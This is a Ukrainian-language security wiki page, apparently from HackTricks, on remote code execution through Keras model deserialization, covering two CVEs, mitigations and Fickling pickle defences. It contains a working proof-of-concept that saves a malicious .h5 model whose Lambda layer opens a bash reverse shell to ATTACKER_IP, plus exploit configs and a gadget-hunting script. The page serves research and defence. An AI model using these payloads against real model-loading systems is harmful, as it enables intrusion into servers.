# Keras Model Deserialization RCE and Gadget Hunting

Ця сторінка підсумовує практичні техніки експлуатації pipeline десеріалізації моделей Keras, пояснює внутрішню структуру native-формату .keras і поверхню атаки, а також надає дослідницький toolkit для пошуку Model File Vulnerabilities (MFVs) і post-fix gadgets.

## Внутрішня структура формату моделі .keras

Файл .keras є ZIP-архівом, що містить щонайменше:<sup>[[1]](#references)</sup>
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги у форматі HDF5

config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, визначає класи/функції та відновлює шари/об’єкти зі словників, контрольованих атакувальником.<sup>[[1]](#references)</sup>

Приклад фрагмента об’єкта шару Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Десеріалізація виконує:<sup>[[1]](#references)</sup>
- Імпорт модулів і визначення символів із ключів module/class_name
- Виклик from_config(...) або конструктора з контрольованими атакувальником kwargs
- Рекурсивний обхід вкладених об’єктів (активацій, ініціалізаторів, обмежень тощо)

Історично це надавало атакувальнику, який створює config.json, три примітиви:<sup>[[1]](#references)</sup>
- Контроль над тим, які модулі імпортуються
- Контроль над тим, які класи/функції визначаються
- Контроль над kwargs, які передаються конструкторам/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Першопричина:
- Legacy Lambda deserialization відновлювала Python-функцію з контрольованого атакувальником marshaled code: `func_load()` декодує payload із base64, викликає `marshal.loads()` і створює `FunctionType`. Bytecode отриманої функції виконується під час виклику Lambda, а loaders, що передували версії 2.13, не застосовували перевірки safe-mode для legacy-форматів.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

У native Keras v3 archive Lambda-функція представлена як об’єкт `__lambda__`, поле `code` якого містить marshaled code, закодований у base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Пом’якшення:
- Keras за замовчуванням застосовує `safe_mode=True` для нативного формату Keras v3. Серіалізовані Python-лямбда-функції в `Lambda` блокуються, якщо користувач явно не вимкне захист за допомогою `safe_mode=False`; цей захист не поширюється на legacy-формати таким самим чином.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Примітки:
- Legacy-формати (старі збереження у HDF5) або старі codebase можуть не застосовувати сучасні перевірки, тому атаки в стилі “downgrade” усе ще можливі, якщо жертви використовують старі loaders.

## CVE-2025-1550 – Arbitrary module import у Keras 3.0.0–3.8.x

Першопричина:
- `_retrieve_class_or_fn` використовував `importlib.import_module(module)` для рядків модулів, контрольованих attacker і отриманих із `config.json`.
- Вплив: Спеціально створений `.keras`-архів міг змусити `Model.load_model()` імпортувати вибрані attacker Python-модулі та функції з побічними ефектами під час імпорту й аргументами, контрольованими attacker, навіть за `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ідея exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist модулів: імпорти обмежено модулями офіційної екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Безпечний режим за замовчуванням: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Базова перевірка типів: десеріалізовані об’єкти мають відповідати очікуваним типам

## Практична експлуатація: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Застарілі TensorFlow-Keras deployments можуть і надалі приймати файли моделей HDF5 (`.h5`). Якщо attacker може завантажити модель, яку сервер згодом завантажує або використовує для inference, уразливий loader може десеріалізувати Lambda layer, що містить Python під контролем attacker, після чого цей код може виконатися в робочому процесі моделі застосунку.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Мінімальний PoC для створення шкідливого .h5, у якому Lambda виконує reverse shell, коли target викликає модель:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Нотатки та поради щодо надійності:
- Точки спрацювання залежать від формату та робочого процесу; у згаданому матеріалі payload виконався двічі під час prediction. Вважайте побічні ефекти повторюваними та робіть payloads ідемпотентними.<sup>[[7]](#references)</sup>
- Фіксація версій: узгодьте TF/Keras/Python із середовищем жертви, щоб уникнути невідповідностей серіалізації. Наприклад, створюйте artifacts у Python 3.8 з TensorFlow 2.13.1, якщо саме це використовує цільова система.<sup>[[7]](#references)</sup>
- Швидке відтворення середовища:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Валідація: benign payload на кшталт os.system("ping -c 1 YOUR_IP") допомагає підтвердити виконання (наприклад, спостерігаючи ICMP за допомогою tcpdump) перед переходом до reverse shell.<sup>[[7]](#references)</sup>

## Поверхня gadget усередині allowlist після виправлення

Навіть із allowlist модулів Keras і safe mode дозволені callables можуть створювати side effects. Наприклад, `keras.utils.get_file` завантажує URL і записує його в налаштоване розташування cache, що робить його кандидатом для gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>

Конфігурація Lambda-кандидата (перевірте сигнатуру виклику в контрольованому тесті):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- `Lambda.call()` завжди передає вхідні дані моделі як перший позиційний аргумент, а налаштовані `arguments` — як keyword arguments. Для `get_file` це позиційне значення заповнює `fname`; невідповідність tensor/path може спричинити збій цього кандидата ще до будь-якого завантаження, тому це не гарантовано робочий gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting імпортів ML pickle для AI/ML-моделей (Fickling)

Багато форматів AI/ML-моделей (PyTorch `.pt`/`.pth`/`.ckpt`, артефакти joblib/scikit-learn та інші Python-native формати) містять дані Python pickle. Застарілий шлях Keras Lambda, описаний вище, натомість використовує marshaled байткод функцій, тому є окремим ризиком десеріалізації. Opcodes pickle можуть викликати поведінку, контрольовану атакувальником, під час десеріалізації, зокрема tampering моделі або RCE, а прості сканери можуть пропустити нові чи не внесені до списку небезпечні імпорти.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Практичний захист за принципом fail-closed полягає в перехопленні десеріалізатора pickle у Python і дозволі лише перевіреного набору безпечних імпортів, пов’язаних із ML, під час unpickling. Fickling від Trail of Bits реалізує цю політику та містить підготовлений ML import allowlist, сформований на основі тисяч публічних pickle-файлів із Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Модель безпеки для «безпечних» імпортів (інтуїтивні положення, узагальнені з досліджень і практики): імпортовані символи, які використовує pickle, мають одночасно:<sup>[[8]](#references)</sup>
- Не виконувати код і не спричиняти його виконання (без compiled/source code objects, запуску shell-команд, hooks тощо)
- Не отримувати та не встановлювати довільні attributes або items
- Не імпортувати та не отримувати references на інші Python-об’єкти з pickle VM
- Не запускати жодні secondary deserializers (наприклад, marshal або вкладений pickle), навіть опосередковано

Увімкніть protections Fickling якомога раніше під час запуску процесу, щоб усі pickle loads, які виконують frameworks (`torch.load`, `joblib.load` тощо), перевірялися:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Практичні поради:
- За потреби можна тимчасово вимкнути або повторно увімкнути hooks:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Якщо завідомо безпечну модель заблоковано, розширте allowlist для вашого середовища після перевірки символів:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling також надає generic runtime guards, якщо вам потрібен більш granular контроль:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` для застосування перевірок до всіх `pickle.load()`
- `with fickling.check_safety():` для enforcement у межах певної області
- `fickling.load(path)` / `fickling.is_likely_safe(path)` для одноразових перевірок

- За можливості надавайте перевагу форматам моделей, відмінним від pickle (наприклад, SafeTensors).<sup>[[15]](#references)</sup> Якщо ви мусите приймати pickle, запускайте loaders із мінімально необхідними privileges, без network egress, і застосовуйте allowlist.

Ця allowlist-first стратегія демонстративно блокує поширені шляхи експлуатації ML pickle, водночас забезпечуючи високу сумісність. У benchmark ToB Fickling виявив 100% синтетичних malicious-файлів і дозволив приблизно 99% clean-файлів із популярних репозиторіїв Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Інструментарій дослідника

1) Систематичне виявлення gadget-ів у дозволених модулях

Перелічіть candidate callables у `keras`, `keras_nlp`, `keras_cv`, `keras_hub` і визначте пріоритет для тих, що мають побічні ефекти, пов’язані з файлами, мережею, процесами або середовищем.<sup>[[1]](#references)</sup>

<details>
<summary>Перелік потенційно небезпечних callables у дозволених модулях Keras</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Тестування прямої десеріалізації (архів `.keras` не потрібен)

Передавайте спеціально сформовані словники безпосередньо в десеріалізатори Keras, щоб визначити прийнятні параметри та спостерігати за побічними ефектами.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Дослідження між версіями та форматами

Keras існує в кількох codebase/ерах із різними обмеженнями безпеки та форматами:<sup>[[1]](#references)</sup>
- Вбудований у TensorFlow Keras: tensorflow/python/keras (застарілий, заплановано видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (офіційний): представив нативний .keras

Повторюйте тести в різних codebase і форматах (.keras та legacy HDF5), щоб виявити регресії або відсутні перевірки.

## References

- [1] [Пошук вразливостей у десеріалізації моделей Keras (блог huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Додано перевірки до серіалізації](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE через десеріалізацію Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – довільний імпорт модулів Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [звіт huntr – довільний імпорт №1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [звіт huntr – довільний імпорт №2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – Lambda RCE у TensorFlow .h5 до root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [блог Trail of Bits – новий scanner pickle-файлів AI/ML від Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – захист середовищ AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [корпус тестів для benchmark сканування pickle у Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [передумови атак Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [проєкт SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Lambda Layers у Keras 2 дозволяють довільну ін'єкцію коду](https://kb.cert.org/vuls/id/253266)
- [17] [вихідний код шару Keras Lambda (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [вихідний код Python-утиліт Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
